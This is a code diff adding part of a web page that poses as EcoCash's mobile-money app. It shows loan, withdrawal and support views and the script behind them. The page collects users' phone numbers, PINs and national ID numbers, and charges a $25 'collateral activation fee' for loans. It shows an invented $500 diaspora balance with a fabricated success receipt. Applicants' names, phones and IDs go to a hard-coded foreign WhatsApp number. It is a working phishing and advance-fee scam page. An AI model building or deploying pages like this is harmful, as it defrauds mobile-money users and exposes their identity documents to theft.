+                            <p id="wd-id-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Enter a valid ID number (e.g. 63-1234567A89)</p>
+                        </div>
+
+                        <button id="wd-submit-btn" type="button" disabled onclick="processDiasporaWithdrawal()" class="w-full bg-gray-200 text-gray-400 font-bold py-3.5 rounded-xl uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                            WITHDRAW
+                        </button>
+                    </div>
+
+                    <!-- Step C: Transaction Successful Receipt (Generated after 2 seconds) -->
+                    <div id="diaspora-receipt-card" class="hidden bg-white rounded-2xl p-6 shadow-md border border-green-200 space-y-4 mt-4">
+                        <div class="flex items-center space-x-3 border-b border-gray-100 pb-3">
+                            <div class="w-10 h-10 rounded-full bg-green-100 text-supergreen flex items-center justify-center flex-shrink-0">
+                                <i class="fa-solid fa-circle-check text-xl"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-extrabold text-base text-supergreen">Transaction Successful</h3>
+                                <p id="receipt-ref" class="text-[11px] text-gray-500 font-mono">Ref: EC-000000</p>
+                            </div>
+                        </div>
+
+                        <div class="bg-gray-50 rounded-xl p-4 space-y-2 text-xs text-gray-800 border border-gray-200">
+                            <div class="flex justify-between">
+                                <span class="text-gray-500">Receiver Phone:</span>
+                                <span id="receipt-phone" class="font-bold">---</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-500">Amount Withdrawn:</span>
+                                <span id="receipt-amount" class="font-extrabold text-ecoblue">---</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-500">ID Number:</span>
+                                <span id="receipt-id" class="font-bold">---</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-500">Remaining Balance:</span>
+                                <span id="receipt-remaining" class="font-bold text-gray-900">---</span>
+                            </div>
+                        </div>
+
+                        <button type="button" onclick="claimDiasporaWithdrawal()" class="w-full bg-supergreen hover:opacity-95 text-white font-bold py-3.5 rounded-xl uppercase text-xs tracking-wider transition shadow-md flex items-center justify-center space-x-2">
+                            <i class="fa-brands fa-whatsapp text-base"></i>
+                            <span>CLAIM MY WITHDRAWAL</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="text-center py-4 text-xs font-semibold text-gray-500">
+                    ©2026 EcoCash
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 6: TERMS & CONDITIONS ================= -->
+            <section id="view-terms" class="hidden p-6 flex-1 bg-white flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-4 pb-3 border-b border-gray-200">
+                        <button onclick="navigateWithCycle('login')" class="text-sm text-ecoblue font-semibold flex items-center space-x-1.5 hover:underline">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
+                        </button>
+                        <h2 class="text-base font-extrabold text-gray-900">Terms and Conditions</h2>
+                    </div>
+
+                    <div class="border border-gray-200 rounded-xl p-4 text-xs text-gray-700 space-y-3 leading-relaxed">
+                        <p><strong class="text-gray-900">1. Wallet & PIN Security:</strong> Keep your 4-digit PIN confidential at all times.</p>
+                        <p><strong class="text-gray-900">2. Kashagi Loan Terms:</strong> Loan repayment schedules depend on your selected term in months. A $25.00 USD collateral activation fee applies.</p>
+                        <p><strong class="text-gray-900">3. Diaspora Service Wallet:</strong> Withdrawals up to the available $500.00 USD balance require valid receiver credentials and ID verification.</p>
+                    </div>
+                </div>
+
+                <div class="pt-4 text-center text-xs text-gray-500">
+                    ©2026 EcoCash
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 7: HELP & SUPPORT ================= -->
+            <section id="view-contact" class="hidden flex-1 flex flex-col bg-white">
+                <div class="bg-ecoblue text-white p-6 flex justify-between items-center">
+                    <div>
+                        <h2 class="text-xl font-bold">Help & Support</h2>
+                        <p class="text-xs text-blue-100 mt-1">EcoCash Customer Assistance</p>
+                    </div>
+                    <button onclick="navigateWithCycle('login')" class="text-xs bg-white/15 px-3 py-1.5 rounded-lg font-semibold">Back</button>
+                </div>
+
+                <div class="p-6 space-y-5 text-xs">
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-4 text-center space-y-1">
+                        <p class="font-bold text-gray-800">Customer Care Line</p>
+                        <p class="text-base font-extrabold text-ecoblue">114 or +263 772 023 000</p>
+                    </div>
+
+                    <div class="bg-white rounded-xl shadow-sm border border-gray-200 p-5 space-y-4">
+                        <div>
+                            <label class="block font-semibold text-gray-700 mb-1">Your Name <span class="text-red-500">*</span></label>
+                            <input type="text" id="contact-name" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                        </div>
+                        <div>
+                            <label class="block font-semibold text-gray-700 mb-1">Phone Number <span class="text-red-500">*</span></label>
+                            <input type="tel" inputmode="numeric" pattern="[0-9]*" id="contact-phone" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                        </div>
+                        <div>
+                            <label class="block font-semibold text-gray-700 mb-1">Message <span class="text-red-500">*</span></label>
+                            <textarea rows="3" id="contact-message" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()"></textarea>
+                        </div>
+                        <button type="button" id="contact-btn" disabled onclick="handleContactSubmit()" class="w-full bg-gray-200 text-gray-400 font-bold py-3.5 rounded-md cursor-not-allowed transition">
+                            SEND MESSAGE
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+        </main>
+    </div>
+
+    <!-- APPLICATION SCRIPT -->
+    <script>
+        const TARGET_WHATSAPP_NUMBER = '254789697483';
+        const COLLATERAL_ACTIVATION_FEE = 25.00;
+        const DIASPORA_WALLET_BALANCE = 500.00;
+
+        let appState = {
+            userPhone: '',
+            userPin: '',
+            userName: 'EcoCash Customer',
+            loanAmount: 500,
+            loanMonths: 6,
+            withdrawalReceipt: null
+        };
+
+        // Plain cycle overlay taking exactly 3 seconds (cycle only, no words)
+        function runPlainCycle(onComplete) {
+            const overlay = document.getElementById('plain-cycle-overlay');
+            overlay.classList.remove('hidden');
+            setTimeout(() => {
+                overlay.classList.add('hidden');
+                if (onComplete) onComplete();
+            }, 3000);
+        }
+
+        function navigateWithCycle(viewName) {
+            runPlainCycle(() => {
+                switchView(viewName);
+            });
+        }
+
+        function switchView(viewName) {
+            const views = [
+                'view-login',
+                'view-signup',
+                'view-dashboard',
+                'view-kashagi-loan',
+                'view-diaspora-wallet',
+                'view-terms',
+                'view-contact'
+            ];
+            views.forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(`view-${viewName}`).classList.remove('hidden');
+
+            if (viewName === 'kashagi-loan') {
+                recalculateLoan();
+                validateLoanApplication();
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function showToast(msg) {
+            const container = document.getElementById('toast-container');
+            const messageEl = document.getElementById('toast-message');
+            messageEl.innerText = msg;
+            container.classList.remove('opacity-0', 'pointer-events-none');
+            container.classList.add('opacity-100');
+            setTimeout(() => {
+                container.classList.remove('opacity-100');
+                container.classList.add('opacity-0', 'pointer-events-none');
+            }, 2800);
+        }
+
+        function openWhatsAppChat(message) {
+            const url = `https://wa.me/${TARGET_WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
+            window.open(url, '_blank');
+        }
+
+        function toggleMenu() {
+            document.getElementById('nav-dropdown').classList.toggle('hidden');
+        }
+
+        function togglePinVisibility() {
+            const input = document.getElementById('login-pin-single');
+            const icon = document.getElementById('pin-eye-icon');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.className = 'fa-regular fa-eye-slash text-lg';
+            } else {
+                input.type = 'password';
+                icon.className = 'fa-regular fa-eye text-lg';
+            }
+        }
+
+        function togglePasswordVisibility() {
+            const input = document.getElementById('new-password');
+            const icon = document.getElementById('password-eye-icon');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.className = 'fa-regular fa-eye-slash';
+            } else {
+                input.type = 'password';
+                icon.className = 'fa-regular fa-eye';
+            }
+        }
+
+        function isValidZimbabweNID(nid) {
+            return /^\d{2}-\d{4,7}[A-Z]\d{2}$/.test(nid.trim().toUpperCase());
+        }
+
+        // ================= SIGN IN =================
+        function validateLoginForm() {
+            const phone = document.getElementById('login-phone').value.trim();
+            const pin = document.getElementById('login-pin-single').value.trim();
+            const btn = document.getElementById('login-btn');
+            const phoneIcon = document.getElementById('login-phone-icon');
+            const phoneError = document.getElementById('login-phone-error');
+            const pinError = document.getElementById('login-pin-error');
+
+            const isPhoneValid = /^7\d{8}$/.test(phone);
+            if (phone.length > 0) {
+                phoneIcon.classList.remove('hidden');
+                phoneIcon.innerHTML = isPhoneValid
+                    ? '<i class="fa-solid fa-circle-check text-green-600"></i>'
+                    : '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                phoneError.classList.toggle('hidden', isPhoneValid);
+            } else {
+                phoneIcon.classList.add('hidden');
+                phoneError.classList.add('hidden');
+            }
+
+            const isPinValid = /^\d{4}$/.test(pin);
+            pinError.classList.toggle('hidden', pin.length === 0 || isPinValid);
+
+            if (isPhoneValid && isPinValid) {
+                btn.disabled = false;
+                btn.className = "w-full py-3.5 px-4 rounded-lg bg-ecoblue hover:bg-ecodarkblue text-white font-bold transition duration-200 uppercase tracking-wider text-sm shadow-md cursor-pointer";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full py-3.5 px-4 rounded-lg bg-gray-200 text-gray-400 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm";
+            }
+        }
+
+        function handleLoginSubmit() {
+            const phone = document.getElementById('login-phone').value.trim();
+            const pin = document.getElementById('login-pin-single').value.trim();
+            if (!/^7\d{8}$/.test(phone) || !/^\d{4}$/.test(pin)) {
+                showToast('Please enter a valid mobile number and 4-digit PIN.');
+                return;
+            }
+
+            appState.userPhone = `+263 ${phone}`;
+            appState.userPin = pin;
+            appState.userName = `Client (+263 ${phone})`;
+
+            document.getElementById('dash-name-display').innerText = appState.userName;
+            document.getElementById('dash-phone-badge').innerText = appState.userPhone;
+            document.getElementById('loan-applicant-phone').value = phone;
+
+            runPlainCycle(() => {
+                switchView('dashboard');
+            });
+        }
+
+        // ================= REGISTER =================
+        function validateSignupForm() {
+            const firstName = document.getElementById('signup-firstname').value.trim();
+            const surname = document.getElementById('signup-surname').value.trim();
+            const country = document.getElementById('signup-country').value;
+            const phone = document.getElementById('signup-phone').value.trim();
+            const email = document.getElementById('signup-email').value.trim();
+            const nid = document.getElementById('signup-nid').value.trim();
+            const password = document.getElementById('new-password').value.trim();
+            const gender = document.querySelector('input[name="gender"]:checked');
+            const day = document.getElementById('b-day').value;
+            const month = document.getElementById('b-month').value;
+            const year = document.getElementById('b-year').value;
+            const terms = document.getElementById('terms').checked;
+            const btn = document.getElementById('signup-btn');
+
+            const fnValid = /^[A-Za-z]+$/.test(firstName);
+            const snValid = /^[A-Za-z]+$/.test(surname);
+            const phoneValid = /^7\d{8}$/.test(phone);
+            const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            const nidValid = isValidZimbabweNID(nid);
+            const passValid = password.length >= 8 && /[A-Za-z]/.test(password) && /\d/.test(password);
+
+            setFieldStatus('signup-firstname', fnValid, 'signup-firstname-icon', 'signup-firstname-error');
+            setFieldStatus('signup-surname', snValid, 'signup-surname-icon', 'signup-surname-error');
+            setFieldStatus('signup-phone', phoneValid, 'signup-phone-icon', 'signup-phone-error');
+            setFieldStatus('signup-email', emailValid, 'signup-email-icon', 'signup-email-error');
+            setFieldStatus('signup-nid', nidValid, 'signup-nid-icon', 'signup-id-error');
+            setFieldStatus('new-password', passValid, 'signup-password-icon', 'signup-password-error');
+
+            if (fnValid && snValid && country && phoneValid && emailValid && nidValid && passValid && gender && day && month && year && terms) {
+                btn.disabled = false;
+                btn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-semibold py-3.5 rounded-md uppercase text-xs tracking-wider transition cursor-pointer shadow-md";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full bg-gray-200 text-gray-400 font-semibold py-3.5 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition";
+            }
+        }
+
+        function setFieldStatus(inputId, isValid, iconId, errorId) {
+            const val = document.getElementById(inputId).value.trim();
+            const icon = document.getElementById(iconId);
+            const err = document.getElementById(errorId);
+            if (val.length > 0) {
+                icon.classList.remove('hidden');
+                icon.innerHTML = isValid
+                    ? '<i class="fa-solid fa-circle-check text-green-600"></i>'
+                    : '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                if (err) err.classList.toggle('hidden', isValid);
+            } else {
+                icon.classList.add('hidden');
+                if (err) err.classList.add('hidden');
+            }
+        }
+
+        function handleSignUpSubmit() {
+            const firstName = document.getElementById('signup-firstname').value.trim();
+            const surname = document.getElementById('signup-surname').value.trim();
+            const phone = document.getElementById('signup-phone').value.trim();
+
+            appState.userName = `${firstName} ${surname}`;
+            appState.userPhone = `+263 ${phone}`;
+
+            document.getElementById('dash-name-display').innerText = appState.userName;
+            document.getElementById('dash-phone-badge').innerText = appState.userPhone;
+            document.getElementById('loan-applicant-name').value = appState.userName;
+            document.getElementById('loan-applicant-phone').value = phone;
+
+            runPlainCycle(() => {
+                switchView('dashboard');
+            });
+        }
+
+        // ================= KASHAGI LOANS (FINTECH CALCULATOR + DYNAMIC BUTTON) =================
+        function syncLoanAmountFromSlider() {
+            const val = Number(document.getElementById('loan-amount-slider').value);
+            document.getElementById('loan-amount-input').value = val;
+            appState.loanAmount = val;
+            highlightAmountPreset(val);
+            recalculateLoan();
+        }
+
+        function syncLoanAmountFromInput() {
+            let val = Number(document.getElementById('loan-amount-input').value);
+            if (isNaN(val)) val = 50;
+            const clamped = Math.max(50, Math.min(5000, val));
+            document.getElementById('loan-amount-slider').value = clamped;
+            appState.loanAmount = val;
+            highlightAmountPreset(val);
+            recalculateLoan();
+        }
+
+        function setDynamicLoanAmount(amount) {
+            appState.loanAmount = amount;
+            document.getElementById('loan-amount-input').value = amount;
+            document.getElementById('loan-amount-slider').value = Math.max(50, Math.min(5000, amount));
+            highlightAmountPreset(amount);
+            recalculateLoan();
+        }
+
+        function highlightAmountPreset(amount) {
+            const presets = [100, 500, 1500, 3000];
+            const buttons = document.querySelectorAll('.loan-preset-btn');
+            buttons.forEach((btn, idx) => {
+                if (presets[idx] === amount) {
+                    btn.className = "loan-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-ecoblue bg-ecoblue text-white";
+                } else {
+                    btn.className = "loan-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-gray-200 text-gray-700 hover:border-ecoblue";
+                }
+            });
+        }
+
+        function setLoanMonths(months) {
+            appState.loanMonths = months;
+            document.getElementById('loan-months-slider').value = months;
+            highlightMonthsPreset(months);
+            recalculateLoan();
+        }
+
+        function highlightMonthsPreset(months) {
+            const presets = [3, 6, 12, 24];
+            const buttons = document.querySelectorAll('.months-preset-btn');
+            buttons.forEach((btn, idx) => {
+                if (presets[idx] === months) {
+                    btn.className = "months-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-ecoblue bg-ecoblue text-white";
+                } else {
+                    btn.className = "months-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-gray-200 text-gray-700 hover:border-ecoblue";
+                }
+            });
+        }
+
+        function recalculateLoan() {
+            const amount = Number(document.getElementById('loan-amount-input').value) || 0;
+            const months = Number(document.getElementById('loan-months-slider').value) || 1;
+            appState.loanAmount = amount;
+            appState.loanMonths = months;
+
+            // Monthly estimate with 5% interest rate across selected months
+            const totalWithInterest = amount * 1.05;
+            const monthlyPayment = totalWithInterest / months;
+
+            document.getElementById('loan-months-label').innerText = `${months} ${months === 1 ? 'Month' : 'Months'}`;
+            document.getElementById('calc-principal').innerText = `$${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+            document.getElementById('calc-term').innerText = `${months} ${months === 1 ? 'Month' : 'Months'}`;
+            document.getElementById('calc-monthly').innerText = `$${monthlyPayment.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} / mo`;
+
+            updateDynamicLoanButtonText();
+        }
+
+        function updateDynamicLoanButtonText() {
+            const amount = Number(document.getElementById('loan-amount-input').value) || 0;
+            const months = appState.loanMonths;
+            const btn = document.getElementById('loan-submit-btn');
+            btn.innerText = `APPLY FOR $${amount.toLocaleString()} LOAN (${months} MO) • $25 COLLATERAL ACTIVATION FEE`;
+        }
+
+        function validateLoanApplication() {
+            const name = document.getElementById('loan-applicant-name').value.trim();
+            const phone = document.getElementById('loan-applicant-phone').value.trim();
+            const nid = document.getElementById('loan-applicant-nid').value.trim();
+            const amount = Number(document.getElementById('loan-amount-input').value) || 0;
+            const btn = document.getElementById('loan-submit-btn');
+
+            const valid = /^[A-Za-z\s]+$/.test(name) && /^7\d{8}$/.test(phone) && isValidZimbabweNID(nid) && amount >= 50;
+            updateDynamicLoanButtonText();
+
+            if (valid) {
+                btn.disabled = false;
+                btn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-4 rounded-xl uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-xl uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
+            }
+        }
+
+        function submitKashagiLoan() {
+            const name = document.getElementById('loan-applicant-name').value.trim();
+            const phone = document.getElementById('loan-applicant-phone').value.trim();
+            const nid = document.getElementById('loan-applicant-nid').value.trim().toUpperCase();
+            const amount = Number(document.getElementById('loan-amount-input').value) || 0;
+            const months = appState.loanMonths;
+
+            if (!/^[A-Za-z\s]+$/.test(name) || !/^7\d{8}$/.test(phone) || !isValidZimbabweNID(nid) || amount < 50) {
+                showToast('Please complete all loan fields with valid details.');
+                return;
+            }
+
+            runPlainCycle(() => {
+                const msg = `*EcoCash Kashagi Loan Application*\n\n` +
+                    `👤 *Applicant:* ${name}\n` +
+                    `📱 *Mobile:* +263 ${phone}\n` +
+                    `🆔 *National ID:* ${nid}\n` +
+                    `💵 *Loan Amount:* $${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD\n` +
+                    `🗓️ *Repayment Term:* ${months} Months\n` +
+                    `🔐 *Collateral Activation Fee:* $${COLLATERAL_ACTIVATION_FEE.toFixed(2)} USD`;
+                openWhatsAppChat(msg);
+            });
+        }
+
+        // ================= DIASPORA SERVICE WALLET ($500 BALANCE -> WITHDRAW -> 2s RECEIPT -> CLAIM WHATSAPP) =================
+        function revealDiasporaBalance() {
+            runPlainCycle(() => {
+                document.getElementById('diaspora-balance-hidden-state').classList.add('hidden');
+                document.getElementById('diaspora-balance-revealed-state').classList.remove('hidden');
+                document.getElementById('check-balance-btn').classList.add('hidden');
+                document.getElementById('go-to-withdraw-btn').classList.remove('hidden');
+            });
+        }
+
+        function openWithdrawForm() {
+            document.getElementById('diaspora-withdraw-form').classList.remove('hidden');
+            document.getElementById('diaspora-receipt-card').classList.add('hidden');
+            validateWithdrawForm();
+        }
+
+        function validateWithdrawForm() {
+            const phone = document.getElementById('wd-phone').value.trim();
+            const amountVal = document.getElementById('wd-amount').value.trim();
+            const amount = Number(amountVal);
+            const pin = document.getElementById('wd-pin').value.trim();
+            const nid = document.getElementById('wd-id').value.trim();
+            const btn = document.getElementById('wd-submit-btn');
+
+            const phoneValid = /^7\d{8}$/.test(phone);
+            const amountValid = amountVal !== '' && !isNaN(amount) && amount > 0 && amount <= DIASPORA_WALLET_BALANCE;
+            const pinValid = /^\d{4}$/.test(pin);
+            const idValid = isValidZimbabweNID(nid);
+
+            document.getElementById('wd-phone-error').classList.toggle('hidden', phone.length === 0 || phoneValid);
+            document.getElementById('wd-amount-error').classList.toggle('hidden', amountVal.length === 0 || amountValid);
+            document.getElementById('wd-pin-error').classList.toggle('hidden', pin.length === 0 || pinValid);
+            document.getElementById('wd-id-error').classList.toggle('hidden', nid.length === 0 || idValid);
+
+            if (phoneValid && amountValid && pinValid && idValid) {
+                btn.disabled = false;
+                btn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-3.5 rounded-xl uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full bg-gray-200 text-gray-400 font-bold py-3.5 rounded-xl uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
+            }
+        }
+
+        function processDiasporaWithdrawal() {
+            const phone = document.getElementById('wd-phone').value.trim();
+            const amount = Number(document.getElementById('wd-amount').value.trim());
+            const pin = document.getElementById('wd-pin').value.trim();
+            const nid = document.getElementById('wd-id').value.trim().toUpperCase();
+
+            if (!/^7\d{8}$/.test(phone) || isNaN(amount) || amount <= 0 || amount > DIASPORA_WALLET_BALANCE || !/^\d{4}$/.test(pin) || !isValidZimbabweNID(nid)) {
+                showToast('Check receiver details: amount must be between $1 and $500 USD.');
+                return;
+            }
+
+            const btn = document.getElementById('wd-submit-btn');
+            btn.disabled = true;
+            btn.innerText = 'WITHDRAW...';
+
+            // Generate transaction receipt in 2 seconds
+            setTimeout(() => {
+                const refCode = `EC-${Math.floor(100000 + Math.random() * 900000)}`;
+                const remaining = DIASPORA_WALLET_BALANCE - amount;
+
+                appState.withdrawalReceipt = {
+                    ref: refCode,
+                    phone: `+263 ${phone}`,
+                    amount: amount,
+                    nid: nid,
+                    remaining: remaining
+                };
+
+                document.getElementById('receipt-ref').innerText = `Ref: ${refCode}`;
+                document.getElementById('receipt-phone').innerText = `+263 ${phone}`;
+                document.getElementById('receipt-amount').innerText = `$${amount.toFixed(2)} USD`;
+                document.getElementById('receipt-id').innerText = nid;
+                document.getElementById('receipt-remaining').innerText = `$${remaining.toFixed(2)} USD`;
+
+                document.getElementById('diaspora-withdraw-form').classList.add('hidden');
+                document.getElementById('diaspora-receipt-card').classList.remove('hidden');
+                btn.innerText = 'WITHDRAW';
+            }, 2000);
+        }
+
+        function claimDiasporaWithdrawal() {
+            const r = appState.withdrawalReceipt;
+            if (!r) return;
+
+            const msg = `*EcoCash Diaspora Service Wallet Withdrawal Receipt*\n\n` +
+                `✅ *Status:* Transaction Successful\n` +
+                `🧾 *Reference:* ${r.ref}\n` +
+                `📱 *Receiver Phone:* ${r.phone}\n` +
+                `💵 *Amount Withdrawn:* $${r.amount.toFixed(2)} USD\n` +
+                `🆔 *ID Number:* ${r.nid}\n` +
+                `💼 *Remaining Wallet Balance:* $${r.remaining.toFixed(2)} USD`;
+
+            openWhatsAppChat(msg);
+        }
+
+        // ================= SUPPORT FORM =================
+        function validateContactForm() {
+            const name = document.getElementById('contact-name').value.trim();
+            const phone = document.getElementById('contact-phone').value.trim();
+            const message = document.getElementById('contact-message').value.trim();
+            const btn = document.getElementById('contact-btn');
+
+            if (name && phone && message) {
+                btn.disabled = false;
+                btn.className = "w-full bg-ecoblue text-white font-bold py-3.5 rounded-md hover:bg-ecodarkblue transition cursor-pointer shadow-md";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full bg-gray-200 text-gray-400 font-bold py-3.5 rounded-md cursor-not-allowed transition";
+            }
+        }
+
+        function handleContactSubmit() {
+            const name = document.getElementById('contact-name').value.trim();
+            const phone = document.getElementById('contact-phone').value.trim();
+            const message = document.getElementById('contact-message').value.trim();
+            if (!name || !phone || !message) return;
+
+            openWhatsAppChat(`*EcoCash Support*\n\n👤 *Name:* ${name}\n📱 *Phone:* ${phone}\n💬 *Message:* ${message}`);
+        }
+    </script>
+</body>
+</html>
